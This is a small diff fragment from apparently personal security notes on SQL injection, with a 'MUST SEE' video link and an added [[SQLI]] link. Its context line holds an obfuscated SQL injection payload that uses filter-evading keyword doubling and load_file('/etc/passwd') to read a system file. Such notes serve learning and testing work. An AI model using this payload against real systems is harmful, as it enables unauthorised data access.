@@ -367,4 +367,6 @@ damn’UnIUNIONon/**/sESELECTlect/**/1,2,load_file(‘/etc/passwd’),4||1=’1 
 ---
 ## MUST SEE
 - https://www.youtube.com/watch?v=0tqF7lx_dBg
-- 
+
+
+[[SQLI]]
